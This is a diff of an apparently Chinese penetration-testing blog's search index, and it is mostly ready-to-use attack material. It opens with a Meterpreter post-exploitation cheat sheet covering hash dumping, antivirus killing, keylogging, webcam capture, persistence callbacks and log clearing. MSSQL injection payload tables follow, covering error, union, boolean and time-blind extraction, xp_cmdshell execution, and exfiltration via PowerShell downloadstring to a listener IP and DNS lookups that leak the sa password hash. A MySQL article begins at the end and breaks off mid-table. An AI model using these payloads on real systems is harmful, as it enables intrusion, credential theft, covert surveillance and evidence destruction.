+<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>MS17-010</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MSSQL注入</title>
     <url>/article/MSSQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>端口：1433</p>
@@ -2130,7 +2130,7 @@
 </tr>
 <tr>
 <td align="left">获取数据库数量</td>
-<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
+<td align="left">当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as <br><br><code>?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --</code>  <br><br>使用convert <br><code>?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) --</code> <br><br>或使用二分法 <br><code>?id=1&#39; and 1&lt;(select count(db_name) from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库名称</td>
@@ -2145,19 +2145,19 @@
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取表的字段数量</td>
+<td align="left">获取列的数量</td>
 <td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)--</code>  <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段名称</td>
+<td align="left">获取列名</td>
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段的数据数量</td>
+<td align="left">获取数据数量</td>
 <td align="left"><code>?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) -- </code> <br><br><code>?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) --</code>  <br><br>二分法 <br><code>?id=1&#39; and 1&lt;(select count(username) from tbname..users) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据</td>
+<td align="left">获取数据值</td>
 <td align="left"><code>?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) --</code></td>
 </tr>
 </tbody></table>
@@ -2170,7 +2170,7 @@
 </thead>
 <tbody><tr>
 <td align="left">判断列数</td>
-<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、变参数为不存在 <br>2、用null代替空字符</td>
+<td align="left"><code>?id=1&#39; order by 3 --</code> <br>注： mssql union select 要求前后数据类型保持一致<br>1、用null代替显示位 <br>2、带个替换null，确定数据类型</td>
 </tr>
 <tr>
 <td align="left">判断显示位</td>
@@ -2178,43 +2178,43 @@
 </tr>
 <tr>
 <td align="left">获取数据库版本</td>
-<td align="left"><code>?id=-1&#39; union select 1,@@version,3</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,@@version,3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取当前数据库名称</td>
-<td align="left"><code>?id=-1&#39; union select 1,db_name(),3 –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,db_name(),3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库数量</td>
-<td align="left"><code>?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 --</code></td>
 </tr>
 <tr>
 <td align="left">获取数据库名称</td>
-<td align="left"><code>?id=-1&#39; union select 1,db_name(1),3</code> <br>db_name()表示当前数据库，db_name(1)表示第一个数据库  <br><br>或 <br><code>?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) –</code></td>
+<td align="left"><code>?id=-1&#39; union select 1,db_name(1),3 --</code> <br>db_name()表示当前数据库，db_name(1)表示第一个数据库  <br><br>或 <br><code>?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">获取表数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables –</code></td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables --</code></td>
 </tr>
 <tr>
 <td align="left">获取表名称</td>
-<td align="left">显示当前数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) – </code> <br><br>显示指定数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) –</code></td>
+<td align="left">显示当前数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) -- </code> <br><br>显示指定数据库下的表名 <br><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns –</code>  <br><br>获取指定表中的字段数量 <br><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; –</code></td>
+<td align="left">获取列数量</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns --</code>  <br><br>获取指定表中的字段数量 <br><code>?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --</code></td>
 </tr>
 <tr>
-<td align="left">获取表中字段</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) –</code><br><br>指定表获取字段 <br><code>?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=’users’ and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) –</code></td>
+<td align="left">获取列名</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) --</code><br><br>指定表获取字段 <br><code>?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据数量</td>
-<td align="left"><code>?id=-1&#39; union select top 1 1,count(username),3 from test..users –</code></td>
+<td align="left">获取数据数量</td>
+<td align="left"><code>?id=-1&#39; union select top 1 1,count(username),3 from test..users --</code></td>
 </tr>
 <tr>
-<td align="left">获取字段数据</td>
-<td align="left"><code>?id=-1&#39; union select top 1 username,password from test..users where username not in (select top 0 username from test..users) –</code></td>
+<td align="left">获取数据值</td>
+<td align="left"><code>?id=-1&#39; union select top 1 username from test..users where username not in (select top 0 username from test..users) --</code></td>
 </tr>
 </tbody></table>
 <h1 id="四、Bool盲注（二分法）"><a href="#四、Bool盲注（二分法）" class="headerlink" title="四、Bool盲注（二分法）"></a>四、Bool盲注（二分法）</h1><table>
@@ -2226,71 +2226,71 @@
 </thead>
 <tbody><tr>
 <td align="left">判断</td>
-<td align="left"><code>?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 –</code></td>
+<td align="left"><code>?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len(@@version)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len(@@version)--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len(db_name())–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len(db_name()) --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断表数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表长</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表名</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) –</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) --</code></td>
 </tr>
 <tr>
-<td align="left">判断字段数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=’tbname’)–</code></td>
+<td align="left">判断列数</td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = ‘tbname’)))–</code></td>
+<td align="left">逐个判断列的长度</td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段名称</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) –</code></td>
+<td align="left">逐个判断列名</td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据数量</td>
-<td align="left"><code>?id=1&#39; and 1&lt;(select count(username) from dbname..tbname)–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;(select count(username) from dbname..tbname) --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据长度</td>
-<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))–</code></td>
+<td align="left"><code>?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users))) --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断数据名</td>
-<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) –</code></td>
+<td align="left">逐个判断数据值</td>
+<td align="left"><code>?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) --</code></td>
 </tr>
 </tbody></table>
 <h1 id="五、时间延时盲注"><a href="#五、时间延时盲注" class="headerlink" title="五、时间延时盲注"></a>五、时间延时盲注</h1><table>
@@ -2302,67 +2302,67 @@
 </thead>
 <tbody><tr>
 <td align="left">判断数据库版本长度</td>
-<td align="left"><code>?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库版本名</td>
-<td align="left"><code>?id=1&#39; if(ascii(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring(@@version),1,1)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库长度</td>
-<td align="left"><code>?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断当前数据库名称</td>
-<td align="left"><code>?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; –</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断数据库数量</td>
-<td align="left"><code>?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库长度</td>
-<td align="left"><code>?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据库名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">判断表数量</td>
-<td align="left"><code>?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表长度</td>
-<td align="left"><code>?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断表名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">判断字段数量</td>
-<td align="left"><code>?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">判断列数</td>
+<td align="left"><code>?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段长度</td>
-<td align="left"><code>?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = ‘tbname’))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断列长</td>
+<td align="left"><code>?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断字段名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断列名</td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">判断数据数量</td>
-<td align="left"><code>?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
 <td align="left">逐个判断数据长度</td>
-<td align="left"><code>?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left"><code>?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39; --</code></td>
 </tr>
 <tr>
-<td align="left">逐个判断数据名</td>
-<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;–</code></td>
+<td align="left">逐个判断数据值</td>
+<td align="left"><code>?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--</code></td>
 </tr>
 </tbody></table>
 <h1 id="六、命令执行"><a href="#六、命令执行" class="headerlink" title="六、命令执行"></a>六、命令执行</h1><p>xp_cmdshell 默认关闭状态/管理员才可以开启</p>
@@ -2376,7 +2376,7 @@
 
 <p><strong>用sql注入，来获取命令执行结果</strong></p>
 <p>1、创建一个表，再把命令执行的结果，写入到表中。</p>
-<pre class="highlight"><span class="line">?id=1&#x27;; create table sqldata(result VARCHAR(8000)); –</span><br></pre>
+<pre class="highlight"><span class="line">`?id=1&#x27;; create table sqldata(result VARCHAR(8000)); --`</span><br></pre>
 
 <p>2、执行命令，并且把结果写入表中</p>
 <table>
@@ -2388,11 +2388,11 @@
 </thead>
 <tbody><tr>
 <td align="left">直接写入</td>
-<td align="left"><code>?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;–</code></td>
+<td align="left"><code>?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;--</code></td>
 </tr>
 <tr>
 <td align="left">转换一下</td>
-<td align="left"><code>?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa–</code></td>
+<td align="left"><code>?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--</code></td>
 </tr>
 </tbody></table>
 <h1 id="七、DNS外带"><a href="#七、DNS外带" class="headerlink" title="七、DNS外带"></a>七、DNS外带</h1><table>
@@ -2404,19 +2404,19 @@
 </thead>
 <tbody><tr>
 <td align="left">字符型外带–指定ip端口</td>
-<td align="left"><code>?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) –</code></td>
+<td align="left"><code>?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
 </tr>
 <tr>
 <td align="left">数字型外带–指定ip端口</td>
-<td align="left"><code>?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) –</code></td>
+<td align="left"><code>?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --</code></td>
 </tr>
 <tr>
 <td align="left">字符型外带–dnslog平台***</td>
-<td align="left"><code>?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)–</code></td>
+<td align="left"><code>?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)--</code></td>
 </tr>
 <tr>
 <td align="left">数字型外带–dnslog平台</td>
-<td align="left"><code>?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)–</code></td>
+<td align="left"><code>?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)--</code></td>
 </tr>
 </tbody></table>
 <p>http外带需要监听http端口（python -m http.server 9008）</p>
@@ -2426,6 +2426,546 @@
       </categories>
       <tags>
         <tag>MSSQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入</title>
+    <url>/article/Mysql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>端口：3306</p>
+<h1 id="一、SQL注入产生原因"><a href="#一、SQL注入产生原因" class="headerlink" title="一、SQL注入产生原因"></a>一、SQL注入产生原因</h1><p>1、不当的类型处理</p>
+<p>2、不安全的数据库配置</p>
+<p>3、不合理的查询集处理</p>
+<p>4、不当的错误处理</p>
+<p>5、转义字符处理不合适</p>
+<p>6、多个提交处理不当</p>
+<h1 id="二、SQL注入关键条件"><a href="#二、SQL注入关键条件" class="headerlink" title="二、SQL注入关键条件"></a>二、SQL注入关键条件</h1><p>1、用户能控制输入的内容</p>
+<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
+<p>SQL注入分类</p>
+<table>
+<thead>
+<tr>
+<th align="left">分类</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">根据请求方式分类 （判断注入工具：Burpsuite等）</td>
+<td align="left">GET方式请求注入 POST方式请求注入</td>
+</tr>
+<tr>
+<td align="left">根据注入点参数分类 （判断手法：’、”、\）</td>
+<td align="left">字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）</td>
+</tr>
+<tr>
+<td align="left">根据SQL注入点反馈类型分类（重点） （判断注入payload）</td>
+<td align="left">union类型 基于错误显示 布尔类型 基于时间 其他类型</td>
+</tr>
+<tr>
+<td align="left">根据Web应用的数据库类型分类 （判断注入语句）</td>
+<td align="left">MySQL SQLServer Oracle Access</td>
+</tr>
+</tbody></table>
+<p>基于反馈类型分类注入流程</p>
+<table>
+<thead>
+<tr>
